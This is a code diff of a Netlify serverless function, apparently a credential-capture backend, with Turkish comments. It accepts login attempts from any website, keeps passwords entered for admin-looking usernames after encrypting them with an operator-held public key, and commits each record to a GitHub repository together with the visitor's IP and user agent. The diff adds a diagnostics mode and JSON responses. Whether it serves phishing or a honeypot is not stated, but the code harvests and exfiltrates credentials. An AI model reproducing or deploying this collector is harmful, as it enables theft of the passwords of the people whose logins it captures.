@@ -1,33 +1,28 @@
 // netlify/functions/log-admin-capture.js
 // Logs: logs/admin/<UTC-DAY>/<timestamp>.<status>.json
-// Status values: empty | too_short | non_admin | admin_probe (GET) | admin_ok (POST)
+// Status: empty | too_short | non_admin | admin_probe (GET) | admin_ok (POST)
 
 const crypto = require("crypto");
 
-// --- Public key helpers ------------------------------------------------------
 function normalizePem(input) {
   if (!input) return "";
   let s = String(input).trim();
-  s = s.replace(/^['"`]+|['"`]+$/g, "");       // çevresel quote kırp
-  s = s.replace(/\\r/g, "\r").replace(/\\n/g, "\n"); // \r,\n kaçışlarını gerçek newline'a çevir
+  s = s.replace(/^['"`]+|['"`]+$/g, "");
+  s = s.replace(/\\r/g, "\r").replace(/\\n/g, "\n");
   if (s.includes("BEGIN PUBLIC KEY")) return s;
-
-  // sade b64 gövde geldiyse PEM sar
   const body = s.replace(/[\r\n\s-]/g, "");
   const chunks = body.match(/.{1,64}/g) || [];
   return `-----BEGIN PUBLIC KEY-----\n${chunks.join("\n")}\n-----END PUBLIC KEY-----\n`;
 }
-
 function pemFromEnv() {
   const b64 = (process.env.AUDIT_PUBKEY_B64 || "").trim();
   if (b64) {
     try { return Buffer.from(b64, "base64").toString("utf8"); }
-    catch (e) { console.error("AUDIT_PUBKEY_B64 decode failed:", e.message); }
+    catch(e){ console.error("AUDIT_PUBKEY_B64 decode failed:", e.message); }
   }
   return normalizePem(process.env.AUDIT_PUBKEY_PEM || "");
 }
 
-// --- GitHub write helper -----------------------------------------------------
 async function writeToGithub(path, jsonObj) {
   const owner  = process.env.GITHUB_OWNER;
   const repo   = process.env.GITHUB_REPO;
@@ -36,11 +31,11 @@ async function writeToGithub(path, jsonObj) {
 
   if (!owner || !repo || !token) {
     console.error("Missing GitHub envs (GITHUB_OWNER/REPO/TOKEN)");
-    return { ok: false, status: 500, text: "Missing GitHub config" };
+    return { ok:false, status:500, text:"Missing GitHub config" };
   }
 
   const contentB64 = Buffer.from(JSON.stringify(jsonObj, null, 2)).toString("base64");
-  // 🔧 CRITICAL FIX: encodeURI — slashes korunmalı; encodeURIComponent slashi %2F yapar ve GitHub 404 döner.
+  // ÖNEMLİ: path için encodeURI (encodeURIComponent slashi bozar)
   const url = `https://api.github.com/repos/${owner}/${repo}/contents/${encodeURI(path)}`;
 
   const res = await fetch(url, {
@@ -60,12 +55,11 @@ async function writeToGithub(path, jsonObj) {
   if (!res.ok) {
     const txt = await res.text().catch(() => "");
     console.error("GitHub write failed", res.status, txt.slice(0, 200));
-    return { ok: false, status: 502, text: "GitHub write failed" };
+    return { ok:false, status:502, text:`GitHub write failed ${res.status}` };
   }
-  return { ok: true, status: 200, text: "ok" };
+  return { ok:true, status:200, text:"ok" };
 }
 
-// --- Status logic ------------------------------------------------------------
 function deriveStatus(user, pwLen, isPost) {
   const u = (user || "").toLowerCase().trim();
   if (!u || !pwLen) return "empty";
@@ -74,54 +68,110 @@ function deriveStatus(user, pwLen, isPost) {
   return isPost ? "admin_ok" : "admin_probe";
 }
 
+function jsonResp(obj, code=200) {
+  return {
+    statusCode: code,
+    headers: {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(obj, null, 2),
+  };
+}
+
 exports.handler = async (event) => {
   try {
-    const nowIso = new Date().toISOString();
-    const day = nowIso.slice(0, 10);               // UTC gün
-    const tsSafe = nowIso.replace(/[:.]/g, "-");   // dosya adı güvenli
-    const ip = event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "";
-    const ua = event.headers["user-agent"] || "";
-
-    // --- 0) GET ping: (empty log YOK) ---
-    if (event.httpMethod === "GET") {
-      const q = event.queryStringParameters || {};
-      const username = (q.u || "").toString().trim();
-      const pw_len = parseInt(q.l || "0", 10) || 0;
-
-      const status = deriveStatus(username, pw_len, false);
-      if (status === "empty") return { statusCode: 204, body: "skip-empty" };
-
-      const rec = { ts: nowIso, user: username, pw_len, status, ip, ua, via: "get" };
-      const path = `logs/admin/${day}/${tsSafe}.${status}.json`;
-      const wr = await writeToGithub(path, rec);
-      return { statusCode: wr.status, body: wr.text === "ok" ? "ok-get" : wr.text };
+    if (event.httpMethod === "OPTIONS") {
+      return { statusCode:204, headers: {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type",
+      }};
     }
 
-    // --- 1) POST: admin_ok için şifreyi şifrele ---
+    const nowIso = new Date().toISOString();
+    const day    = nowIso.slice(0,10);
+    const tsSafe = nowIso.replace(/[:.]/g, "-");
+    const ip     = event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "";
+    const ua     = event.headers["user-agent"] || "";
+    const host   = event.headers["host"] || "";
+    const referer= event.headers["referer"] || event.headers["origin"] || "";
+
+    const q = event.queryStringParameters || {};
+    const DIAG = (q.diag === "1") || (q.debug === "1");
+
+    if (event.httpMethod === "GET") {
+      const username = (q.u || "").toString().trim();
+      const pw_len   = parseInt(q.l || "0", 10) || 0;
+
+      const status = deriveStatus(username, pw_len, false);
+      const path   = `logs/admin/${day}/${tsSafe}.${status}.json`;
+
+      // DIAG: sadece bilgi döndür, yazma yok
+      if (DIAG) {
+        return jsonResp({
+          ok: true, diag:true, method:"GET",
+          status, path, host, referer,
+          env: {
+            owner: !!process.env.GITHUB_OWNER,
+            repo:  !!process.env.GITHUB_REPO,
+            token: !!process.env.GITHUB_TOKEN,
+            branch: (process.env.GITHUB_BRANCH || "main"),
+            pubkey: !!(process.env.AUDIT_PUBKEY_PEM || process.env.AUDIT_PUBKEY_B64)
+          }
+        });
+      }
+
+      if (status === "empty") return { statusCode:204, body:"skip-empty" };
+
+      const rec = { ts: nowIso, user: username, pw_len, status, ip, ua, via:"get" };
+      const wr = await writeToGithub(path, rec);
+      return jsonResp({ ok: wr.ok, path, write: wr.text }, wr.status);
+    }
+
     if (event.httpMethod !== "POST") {
-      return { statusCode: 405, body: "Method Not Allowed" };
+      return jsonResp({ ok:false, reason:"method_not_allowed" }, 405);
     }
 
     let payload = {};
     try { payload = JSON.parse(event.body || "{}"); } catch { payload = {}; }
-
     const username = (payload.username || "").toString().trim();
-    const password = typeof payload.password === "string" ? payload.password : null;
-    const pw_len = password ? password.length :
-                   Number.isFinite(payload.pw_len) ? payload.pw_len : 0;
+    const password = (typeof payload.password === "string") ? payload.password : null;
+    const pw_len   = password ? password.length :
+                     Number.isFinite(payload.pw_len) ? payload.pw_len : 0;
 
     const status = deriveStatus(username, pw_len, true);
-    if (status === "empty") return { statusCode: 204, body: "skip-empty" };
+    const path   = `logs/admin/${day}/${tsSafe}.${status}.json`;
 
-    const rec = { ts: nowIso, user: username, pw_len, status, ip, ua, via: "post" };
+    // DIAG: sadece bilgi döndür, yazma yok
+    if (DIAG) {
+      return jsonResp({
+        ok: true, diag:true, method:"POST",
+        status, path, host, referer,
+        env: {
+          owner: !!process.env.GITHUB_OWNER,
+          repo:  !!process.env.GITHUB_REPO,
+          token: !!process.env.GITHUB_TOKEN,
+          branch: (process.env.GITHUB_BRANCH || "main"),
+          pubkey: !!(process.env.AUDIT_PUBKEY_PEM || process.env.AUDIT_PUBKEY_B64)
+        }
+      });
+    }
+
+    if (status === "empty") return { statusCode:204, body:"skip-empty" };
+
+    const rec = { ts: nowIso, user: username, pw_len, status, ip, ua, via:"post" };
 
     if (status === "admin_ok") {
       const pubPem = pemFromEnv();
-      if (!pubPem) return { statusCode: 500, body: "Missing public key" };
+      if (!pubPem) return jsonResp({ ok:false, reason:"Missing public key" }, 500);
 
       let key;
       try { key = crypto.createPublicKey(pubPem); }
-      catch (e) { console.error("createPublicKey failed:", e.message); return { statusCode: 500, body: "Bad public key" }; }
+      catch (e) { console.error("createPublicKey failed:", e.message);
+        return jsonResp({ ok:false, reason:"Bad public key" }, 500); }
 
       let enc;
       try {
@@ -131,17 +181,16 @@ exports.handler = async (event) => {
         );
       } catch (e) {
         console.error("publicEncrypt failed:", e.message);
-        return { statusCode: 500, body: "Encrypt failed" };
+        return jsonResp({ ok:false, reason:"Encrypt failed" }, 500);
       }
       rec.pw_enc_b64 = enc.toString("base64");
     }
 
-    const path = `logs/admin/${day}/${tsSafe}.${rec.status}.json`;
     const wr = await writeToGithub(path, rec);
-    return { statusCode: wr.status, body: wr.text === "ok" ? "ok" : wr.text };
+    return jsonResp({ ok: wr.ok, path, write: wr.text }, wr.status);
 
   } catch (e) {
     console.error("server error:", e && e.stack ? e.stack : e);
-    return { statusCode: 500, body: "server error" };
+    return jsonResp({ ok:false, reason:"server_error" }, 500);
   }
 };
